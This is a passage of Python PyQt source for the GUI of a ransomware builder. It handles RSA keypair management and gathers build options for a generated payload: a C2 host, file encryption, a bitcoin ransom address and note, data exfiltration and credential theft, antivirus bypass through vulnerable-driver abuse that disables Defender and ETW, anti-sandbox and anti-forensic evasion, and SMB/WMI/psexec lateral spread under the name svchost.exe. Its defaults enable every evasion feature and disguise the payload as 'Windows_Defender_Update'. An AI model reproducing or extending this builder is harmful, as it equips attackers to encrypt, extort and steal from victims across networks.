        if not self.rsa_private_pem or not self.rsa_public_pem:
            QMessageBox.warning(self, "Warning", "No keypair to save")
            return

        folder = QFileDialog.getExistingDirectory(
            self,
            "Select folder to save keypair",
            str(Path.home() / "lazyframework_keys"),
        )
        if not folder:
            return

        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            priv_path = os.path.join(folder, f"private_{ts}.pem")
            pub_path = os.path.join(folder, f"public_{ts}.pem")

            with open(priv_path, "w") as f:
                f.write(self.rsa_private_pem)
            os.chmod(priv_path, 0o600)

            with open(pub_path, "w") as f:
                f.write(self.rsa_public_pem)

            self._append_output(f"[+] Saved private: {priv_path}")
            self._append_output(f"[+] Saved public: {pub_path}")

            QMessageBox.information(
                self,
                "Saved",
                f"Keypair saved!\n\n"
                f"Private: {os.path.basename(priv_path)}\n"
                f"Public: {os.path.basename(pub_path)}\n\n"
                f"Folder: {folder}",
            )
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Save failed:\n{e}")

    def _view_keypair(self):
        if not self.rsa_private_pem:
            return

        dialog = QDialog(self)
        dialog.setWindowTitle("🔑 RSA Keypair Viewer")
        dialog.setMinimumSize(900, 650)

        layout = QVBoxLayout(dialog)
        layout.setSpacing(6)

        warn = QLabel(
            "⚠️  WARNING: Private key sangat sensitif. " "Jangan share ke siapapun."
        )
        warn.setStyleSheet(
            "color: #ff5555; font-size: 10pt; font-weight: bold; "
            "padding: 8px; background: rgba(255, 85, 85, 0.1); "
            "border: 1px solid #ff5555; border-radius: 4px;"
        )
        warn.setWordWrap(True)
        layout.addWidget(warn)

        tabs = QTabWidget()

        priv_widget = QWidget()
        priv_layout = QVBoxLayout(priv_widget)
        priv_text = QTextEdit()
        priv_text.setPlainText(self.rsa_private_pem)
        priv_text.setReadOnly(True)
        priv_text.setFont(QFont("Consolas", 9))
        priv_text.setStyleSheet(self._textarea_style())
        priv_layout.addWidget(priv_text)

        priv_btn_row = QHBoxLayout()
        copy_priv = QPushButton("📋 Copy Private Key")
        copy_priv.setStyleSheet(self._action_btn_style("#a31515", "#c72e2e"))
        copy_priv.clicked.connect(
            lambda: self._copy_to_clipboard(self.rsa_private_pem, "Private key")
        )
        priv_btn_row.addWidget(copy_priv)
        priv_btn_row.addStretch()
        priv_layout.addLayout(priv_btn_row)

        tabs.addTab(priv_widget, "🔒 Private Key")

        pub_widget = QWidget()
        pub_layout = QVBoxLayout(pub_widget)
        pub_text = QTextEdit()
        pub_text.setPlainText(self.rsa_public_pem)
        pub_text.setReadOnly(True)
        pub_text.setFont(QFont("Consolas", 9))
        pub_text.setStyleSheet(self._textarea_style())
        pub_layout.addWidget(pub_text)

        pub_btn_row = QHBoxLayout()
        copy_pub = QPushButton("📋 Copy Public Key")
        copy_pub.setStyleSheet(self._action_btn_style("#1f6feb", "#388bfd"))
        copy_pub.clicked.connect(
            lambda: self._copy_to_clipboard(self.rsa_public_pem, "Public key")
        )
        pub_btn_row.addWidget(copy_pub)
        pub_btn_row.addStretch()
        pub_layout.addLayout(pub_btn_row)

        tabs.addTab(pub_widget, "🔓 Public Key")

        layout.addWidget(tabs)

        close_btn = QPushButton("Close")
        close_btn.setFixedHeight(32)
        close_btn.setStyleSheet(self._action_btn_style("#555555", "#777777"))
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)

        dialog.exec()

    def _clear_keypair(self):
        reply = QMessageBox.question(
            self,
            "Clear Keypair",
            "Clear RSA keypair from memory?\n\n"
            "⚠️  If not saved, the key pair will be lost.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return

        self.rsa_private_pem = ""
        self.rsa_public_pem = ""

        self.rsa_status.setText("❌ No keypair generated")
        self.rsa_status.setStyleSheet(
            "color: #ff5555; font-size: 9pt; font-weight: bold; "
            "padding: 6px; background: rgba(255, 85, 85, 0.1); "
            "border-radius: 3px;"
        )
        self.rsa_fingerprint.setVisible(False)

        self.save_keypair_btn.setEnabled(False)
        self.view_keys_btn.setEnabled(False)
        self.clear_keypair_btn.setEnabled(False)

        self._append_output("[*] Keypair cleared from memory")

    def _copy_private_key(self):
        if not self.rsa_private_pem:
            QMessageBox.warning(self, "Warning", "No private key")
            return
        self._copy_to_clipboard(self.rsa_private_pem, "Private key")

    def _copy_to_clipboard(self, text, label="Data"):
        try:
            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            self._append_output(f"[+] {label} copied to clipboard")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Copy failed: {e}")

    def _on_encryption_changed(self, text):
        is_hybrid = "hybrid" in text.lower()
        self.rsa_group.setVisible(is_hybrid)

    # ═══════════════════════════════════════════════════════════════
    # BUILD HANDLERS
    # ═══════════════════════════════════════════════════════════════

    def _browse_output_folder(self):
        folder = QFileDialog.getExistingDirectory(
            self,
            "Select Output Directory",
            self.output_path_input.text() or str(Path.home()),
        )
        if folder:
            self.output_path_input.setText(folder)

    def _browse_icon(self):
        filepath, _ = QFileDialog.getOpenFileName(
            self,
            "Select Icon File",
            str(Path.home()),
            "Icon Files (*.ico *.png *.jpg *.jpeg);;All Files (*.*)",
        )
        if filepath:
            self.icon_path_input.setText(filepath)

    def _browse_ransom_icon(self):
        filepath, _ = QFileDialog.getOpenFileName(
            self,
            "Select Ransom Icon",
            str(Path.home()),
            "Icon Files (*.ico *.png *.icns);;All Files (*.*)",
        )
        if filepath:
            self.icon_url_input.setText(filepath)

    def _update_exe_status(self):
        if "EXE" not in self.format_combo.currentText():
            return

        target_os = self.target_os_combo.currentText()
        host_os = _platform.system().lower()

        file_name = self.file_name_input.text().strip() or "payload"
        base_name = file_name
        for old_ext in [".py", ".exe", ".app", ".bin"]:
            if base_name.lower().endswith(old_ext):
                base_name = base_name[: -len(old_ext)]
                break

        if target_os == "windows" and host_os != "windows":
            self.format_status.setText(
                f"❌ EXE Windows on {host_os.upper()} — NOT SUPPORTED\n"
                f"   PyInstaller cannot cross-compile.\n"
                f"   Use Python output OR change target OS."
            )
            self.format_status.setStyleSheet(
                "color: #ff5555; font-size: 8pt; padding: 4px; "
                "background: rgba(255, 85, 85, 0.15); "
                "border: 1px solid #ff5555; "
                "border-radius: 3px; font-weight: bold;"
            )
        else:
            ext = {"windows": ".exe", "macos": ".app", "linux": ""}.get(target_os, "")
            display_name = base_name + ext if ext else base_name
            self.format_status.setText(
                f"✅ EXE - {host_os.upper()} → {target_os.upper()} → " f"{display_name}"
            )
            self.format_status.setStyleSheet(
                "color: #50fa7b; font-size: 8pt; padding: 4px; "
                "background: rgba(80, 250, 123, 0.1); "
                "border: 1px solid #50fa7b; border-radius: 3px;"
            )

    def _on_format_changed(self, format_name):
        if "EXE" in format_name:
            self.icon_path_input.setEnabled(True)
            self.icon_browse_btn.setEnabled(True)
            self.target_os_combo.setEnabled(True)
            self._update_exe_status()
        else:
            self.format_status.setText("Python - runs with python3")
            self.format_status.setStyleSheet(
                "color: #50fa7b; font-size: 8pt; padding: 2px;"
            )
            self.icon_path_input.setEnabled(False)
            self.icon_browse_btn.setEnabled(False)

    def _on_target_os_changed(self, text):
        if "EXE" in self.format_combo.currentText():
            self._update_exe_status()

    def _generate(self):
        # Validate encryption mode
        enc_text = self.encryption_combo.currentText()
        use_hybrid = "hybrid" in enc_text.lower()

        if use_hybrid and not self.rsa_private_pem:
            reply = QMessageBox.question(
                self,
                "No Keypair",
                "No RSA keypair exists yet.\n\nGenerate automatically now?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            )
            if reply == QMessageBox.StandardButton.Yes:
                self._generate_keypair()
            return

        # Parse encryption
        if use_hybrid:
            encryption = "hybrid"
        elif "xchacha20" in enc_text.lower():
            encryption = "xchacha20"
        elif "aes256" in enc_text.lower():
            encryption = "aes256"
        elif "chacha20" in enc_text.lower():
            encryption = "chacha20"
        elif "xor" in enc_text.lower():
            encryption = "xor"
        elif "rc4" in enc_text.lower():
            encryption = "rc4"
        else:
            encryption = "hybrid"

        # RSA size
        rsa_size_text = self.rsa_size_combo.currentText()
        if "2048" in rsa_size_text:
            rsa_size = 2048
        elif "3072" in rsa_size_text:
            rsa_size = 3072
        else:
            rsa_size = 4096

        format_map = {
            "Python (.py)": "python",
            "EXE": "exe",
        }

        output_dir = self.output_path_input.text().strip()
        if not output_dir:
            output_dir = self.output_dir

        try:
            os.makedirs(output_dir, exist_ok=True)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Cannot create directory:\n{e}")
            return

        # Strip extension
        file_name = self.file_name_input.text().strip() or "payload"
        for old_ext in [".py", ".exe", ".app", ".bin"]:
            if file_name.lower().endswith(old_ext):
                file_name = file_name[: -len(old_ext)]
                break

        format_display = self.format_combo.currentText()
        format_type = format_map.get(format_display, "python")
        target_os = self.target_os_combo.currentText()

        # Cross-compile validation
        host_os = _platform.system().lower()

        if format_type == "exe" and target_os == "windows" and host_os != "windows":
            QMessageBox.critical(
                self,
                "❌ Cross-Compile Not Supported",
                f"<b>Build ABORTED</b><br><br>"
                f"You are on <b>{host_os.upper()}</b> but target is "
                f"<b>Windows</b>.<br><br>"
                f"<b>PyInstaller CANNOT cross-compile.</b><br><br>"
                f"Options:<br>"
                f"  • Change target OS to <b>{host_os}</b><br>"
                f"  • Use <b>Python output</b><br>"
                f"  • Run this GUI on a <b>Windows machine</b>",
            )
            return

        # Build full filename
        ext_map = {
            "python": ".py",
            "windows": ".exe",
            "macos": ".app",
            "linux": "",
        }
        display_ext = ".py" if format_type == "python" else ext_map.get(target_os, "")
        full_filename = file_name + display_ext if display_ext else file_name

        # ═══ Post-exploit actions parsing ═══
        postex_actions = []
        if self.postex_creds_cb.isChecked():
            postex_actions.append("creds")
        if self.postex_discovery_cb.isChecked():
            postex_actions.append("discovery")
        if self.postex_exfil_cb.isChecked():
            postex_actions.append("exfil")
        postex_actions_str = ",".join(postex_actions) if postex_actions else "creds"

        # ═══ Build options dict ═══
        options = {
            "LHOST": self.lhost_input.text().strip(),
            "LPORT": int(self.lport_input.text().strip() or "4444"),
            "ENCRYPTION": encryption,
            "USE_HYBRID": use_hybrid,
            "RSA_KEY_SIZE": rsa_size,
            "RSA_PRIVATE_KEY_PEM": self.rsa_private_pem,
            "RSA_PUBLIC_KEY_PEM": self.rsa_public_pem,
            "EXTENSIONS": self.extensions_input.text().strip()
            or "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv",
            "BTC_ADDRESS": self.btc_input.text().strip(),
            "WALLPAPER": self.wallpaper_cb.isChecked(),
            "RANSOM_NOTE": self.note_input.toPlainText().strip()
            or "YOUR FILES ARE ENCRYPTED!",
            "OUTPUT_FORMAT": format_type,
            "FULL_FILENAME": full_filename,
            "ICON_PATH": self.icon_path_input.text().strip(),
            "COUNTDOWN_SECONDS": 300,
            "EXFILTRATE_FILES": True,
            "MAX_FILE_SIZE_MB": 10,
            "GUI_MODE": self.gui_mode_cb.isChecked(),
            "AV_BYPASS": self.av_bypass_cb.isChecked(),
            "PRIVILEGE_ESCALATION": True,
            "PARALLEL_ENCRYPTION": True,
            "THREAD_COUNT": self.thread_spin.value(),
            "TARGET_OS": target_os,
            "ANTI_VM": self.anti_vm_cb.isChecked(),
            "ANTI_DEBUG": self.anti_debug_cb.isChecked(),
            "ANTI_FORENSIC": self.anti_forensic_cb.isChecked(),
            "ANTI_DUMP": True,
            "ANTI_RECOVERY": self.anti_recovery_cb.isChecked(),
            "ANTI_TIMING": True,
            "ANTI_SANDBOX_USER": True,
            "ANTI_SANDBOX_DISK": True,
            "ANTI_SANDBOX_RAM": True,
            "ANTI_SANDBOX_CPU": True,
            "ANTI_SANDBOX_UPTIME": True,
            "ANTI_NETWORK": True,
            "SELF_DELETE": self.self_delete_cb.isChecked(),
            "POLYMORPHIC": self.polymorphic_cb.isChecked(),
            "ENCRYPT_HEADER": True,
            "TRIPLE_PASS": self.triple_pass_cb.isChecked(),
            "BYOVD_ENABLED": self.byovd_enabled_cb.isChecked(),
            "BYOVD_DRIVER": self.byovd_driver_combo.currentText(),
            "BYOVD_AUTO_KILL_AV": self.byovd_kill_av_cb.isChecked(),
            "BYOVD_DISABLE_ETW": self.byovd_etw_cb.isChecked(),
            "BYOVD_DISABLE_DEFENDER": self.byovd_defender_cb.isChecked(),
            "SMB_SPREAD": self.smb_spread_cb.isChecked(),
            "SMB_METHODS": "smb,wmi,psexec,admin_share,remote_schtasks,scmr",
            "SMB_MAX_HOSTS": self.smb_max_hosts_spin.value(),
            "SMB_SCAN_SUBNETS": self.smb_subnets_input.text().strip(),
            "SMB_TIMEOUT": 5,
            "SMB_CREDENTIALS": "",
            "SMB_PAYLOAD_NAME": "svchost.exe",
            "SMB_PERSIST": self.smb_persist_cb.isChecked(),
            "SMB_SELF_EXEC": self.smb_self_exec_cb.isChecked(),
            "CHANGE_DESKTOP_ICONS": self.change_icons_cb.isChecked(),
            "RANSOM_ICON_URL": self.icon_url_input.text().strip(),
            # ═══ POST-EXPLOIT ═══
            "POST_EXPLOIT_ENABLED": self.postex_enabled_cb.isChecked(),
            "POST_EXPLOIT_ACTIONS": postex_actions_str,
            "POST_EXPLOIT_MAX_EXFIL_MB": self.postex_max_mb_spin.value(),
            "POST_EXPLOIT_EXFIL_METHOD": (self.postex_exfil_method_combo.currentText()),
            "POST_EXPLOIT_EXFIL_CATEGORIES": (
                self.postex_categories_input.text().strip() or "all"
            ),
        }

        if not options["LHOST"]:
            QMessageBox.warning(self, "Error", "Please enter C2 Host")
            return

        # Update UI
        self.build_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.copy_key_btn.setEnabled(False)
        self.copy_payload_btn.setEnabled(False)
        self.status_indicator.setText("🔨 Building...")
        self.status_indicator.setStyleSheet(
            "color: #ffff00; font-size: 10pt; font-weight: bold; border: none;"
        )
        self.progress_bar.setValue(0)
        self.output_text.clear()
        self.payload_text.clear()

        # Start worker
        self.worker = RansomwareBuildWorker(options, output_dir)
        self.worker.output.connect(self._append_output)
        self.worker.progress.connect(self.progress_bar.setValue)
        self.worker.finished.connect(self._on_build_finished)
        self.worker.start()

    def _stop_generation(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait(1000)
            self._append_output("[!] Stopped by user")

        self.build_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_indicator.setText("⏹ Stopped")
        self.status_indicator.setStyleSheet(
            "color: #ff5555; font-size: 10pt; font-weight: bold; border: none;"
        )

    def _append_output(self, text):
        self.output_text.append(text)
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def _on_build_finished(self, success, result, output_type, full_result):
        self.build_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.copy_payload_btn.setEnabled(True)

        if success:
            self.status_indicator.setText("✅ Completed")
            self.status_indicator.setStyleSheet(
                "color: #50fa7b; font-size: 10pt; font-weight: bold; " "border: none;"
            )
            self._append_output(f"[+] Success! {output_type}")

            try:
                features, target_os = self._get_feature_matrix()
                matrix_html = self._format_feature_matrix(features, target_os)

                import html as _html_mod

                result_escaped = _html_mod.escape(str(result))
                output_type_escaped = _html_mod.escape(str(output_type))

                preview_html = f"""
                <html><head><style>
                    body {{ font-family: 'Consolas', monospace;
                            font-size: 9pt;
                            color: #e6edf3;
                            background: #0d1117;
                            padding: 8px; }}
                    .file-path {{ background: #161b22; padding: 6px;
                                  border-radius: 3px; color: #8be9fd;
                                  margin-bottom: 8px;
                                  word-break: break-all; }}
                    .file-path b {{ color: #50fa7b; }}
                </style></head><body>
                    <div class="file-path">
                        <b>📁 Output:</b> {result_escaped}<br>
                        <b>📦 Type:</b> {output_type_escaped}
                    </div>
                    {matrix_html}
                </body></html>
                """

                self.payload_text.setHtml(preview_html)
            except Exception as _e:
                self.payload_text.setPlainText(result)
                self._append_output(f"[!] Feature matrix render error: {_e}")

            self.progress_bar.setValue(100)
            self.last_output_path = result

            if full_result:
                self.current_victim_id = full_result.get("victim_id", "")
                self.current_key_fingerprint = full_result.get("key_fingerprint", "")

                if self.current_victim_id:
                    self.victim_id_display.setText(self.current_victim_id)
                if self.current_key_fingerprint:
                    self.fingerprint_display.setText(self.current_key_fingerprint)

                if full_result.get("rsa_private_key_pem"):
                    self.privkey_status.setText(
                        f"✅ Private key: "
                        f"{len(full_result['rsa_private_key_pem']):,} chars"
                    )
                    self.privkey_status.setStyleSheet(
                        "color: #50fa7b; font-size: 9pt; padding: 6px; "
                        "background: rgba(80, 250, 123, 0.1); "
                        "border-radius: 3px;"
                    )
                    self.copy_key_btn.setEnabled(True)

            msg = f"{output_type} generated!\n\n"
            msg += f"📁 Location: {result}\n"
            if self.current_victim_id:
                msg += f"\n🆔 Victim ID: {self.current_victim_id}"
                msg += f"\n🔑 Fingerprint: {self.current_key_fingerprint}"
                msg += f"\n\n⚠️  SAVE PRIVATE KEY (attacker-side)"

            if self.postex_enabled_cb.isChecked():
                msg += f"\n\n🎯 Post-exploitation: ENABLED"

            QMessageBox.information(self, "✅ Success", msg)
        else:
            self.status_indicator.setText("❌ Failed")
            self.status_indicator.setStyleSheet(
                "color: #ff5555; font-size: 10pt; font-weight: bold; " "border: none;"
            )
            self._append_output(f"[!] Failed: {result}")
            QMessageBox.critical(self, "Error", f"Build failed:\n{result}")

    def _copy_payload(self):
        text = self.payload_text.toPlainText()
        if text:
            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            self._append_output("[+] Payload copied to clipboard!")

    def _open_output_folder(self):
        folder = self.output_path_input.text().strip()
        if not folder:
            folder = self.output_dir

        if os.path.exists(folder):
            if os.name == "nt":
                os.startfile(folder)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", folder])
            else:
                subprocess.Popen(["xdg-open", folder])
        else:
            QMessageBox.warning(self, "Warning", f"Folder not found:\n{folder}")

    def _clear_all(self):
        reply = QMessageBox.question(
            self,
            "Confirm Clear",
            "Clear console and payload preview?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return

        self.output_text.clear()
        self.payload_text.clear()
        self._append_output("[*] Cleared")

    def _reload_config(self):
        reply = QMessageBox.question(
            self,
            "Confirm Reload",
            "Reset all configuration to defaults?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return

        self.lhost_input.setText("127.0.0.1")
        self.lport_input.setText("4444")
        self.encryption_combo.setCurrentIndex(0)
        self.thread_spin.setValue(4)
        self.file_name_input.setText("Windows_Defender_Update")
        self.format_combo.setCurrentIndex(0)
        self.target_os_combo.setCurrentText("all")

        self.av_bypass_cb.setChecked(True)
        self.gui_mode_cb.setChecked(True)
        self.byovd_enabled_cb.setChecked(True)
        self.byovd_kill_av_cb.setChecked(True)
        self.byovd_etw_cb.setChecked(True)
        self.byovd_defender_cb.setChecked(True)
        self.smb_spread_cb.setChecked(True)
        self.smb_persist_cb.setChecked(True)
        self.smb_self_exec_cb.setChecked(True)
        self.anti_vm_cb.setChecked(True)
        self.anti_debug_cb.setChecked(True)
        self.anti_forensic_cb.setChecked(True)
        self.anti_recovery_cb.setChecked(True)
        self.self_delete_cb.setChecked(True)
        self.polymorphic_cb.setChecked(True)
        self.triple_pass_cb.setChecked(True)
        self.wallpaper_cb.setChecked(True)

        # Post-exploit defaults
        self.postex_enabled_cb.setChecked(True)
        self.postex_creds_cb.setChecked(True)
        self.postex_discovery_cb.setChecked(True)
        self.postex_exfil_cb.setChecked(True)
        self.postex_exfil_method_combo.setCurrentIndex(0)
        self.postex_max_mb_spin.setValue(2000)
        self.postex_categories_input.setText("all")

        self._append_output("[*] Configuration reset")
        self.status_indicator.setText("🔄 Config Reset")
        self.status_indicator.setStyleSheet(
            "color: #ffff00; font-size: 10pt; font-weight: bold; border: none;"
        )

    def closeEvent(self, event):
        if self.rsa_private_pem:
            reply = QMessageBox.question(
                self,
                "⚠️ Warning",
                "The RSA key pair is still in memory.\n\n"
                "Have you saved it to a file?\n\n"
                "Exit without saving = KEYPAIR LOST!",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            )
            if reply != QMessageBox.StandardButton.Yes:
                event.ignore()
                return

        self._stop_generation()
        event.accept()

    # ═══════════════════════════════════════════════════════════════
    # STYLING
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _group_style(color="#00ff00"):
        return f"""
            QGroupBox {{
                color: {color};
                border: 1px solid #333333;
                border-radius: 3px;
                margin-top: 5px;
                padding-top: 8px;
                font-weight: bold;
                font-size: 8pt;
                background: #0a0a0a;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 6px;
                padding: 0 6px;
                color: {color};
                background: #0a0a0a;
            }}
        """

    @staticmethod
    def _input_style():
        return """
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 2px;
                padding: 2px 6px;
                font-family: 'Consolas', monospace;
                font-size: 8pt;
            }
            QLineEdit:focus { border-color: #007acc; }
            QLineEdit:disabled { color: #555555; background: #1a1a1a; }
        """

    @staticmethod
    def _combo_style():
        return """
            QComboBox {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 2px;
                padding: 2px 6px;
                font-family: 'Consolas', monospace;
                font-size: 8pt;
            }
            QComboBox:hover { border-color: #007acc; }
            QComboBox::drop-down { border: none; width: 16px; }
            QComboBox::down-arrow {
                image: none;
                border-left: 3px solid transparent;
                border-right: 3px solid transparent;
                border-top: 4px solid #858585;
                width: 0; height: 0;
                margin-right: 4px;
            }
            QComboBox QAbstractItemView {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                selection-background-color: #1f6feb;
                selection-color: #ffffff;
                outline: none;
            }
        """

    @staticmethod
    def _textarea_style():
        return """
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 2px;
                padding: 3px;
                font-family: 'Consolas', monospace;
                font-size: 8pt;
            }
            QTextEdit:focus { border-color: #007acc; }
        """

    @staticmethod
    def _browse_btn_style():
        return """
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 2px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #388bfd; }
            QPushButton:disabled { background: #333333; color: #666666; }
        """

    @staticmethod
    def _action_btn_style(color, hover_color):
        return f"""
            QPushButton {{
                background: {color};
                color: white;
                font-weight: bold;
                font-size: 8pt;
                padding: 3px 8px;
                border: none;
                border-radius: 3px;
                font-family: 'Consolas', monospace;
            }}
            QPushButton:hover {{ background: {hover_color}; }}
            QPushButton:pressed {{ opacity: 0.8; }}
            QPushButton:disabled {{ background: #333333; color: #666666; }}
        """
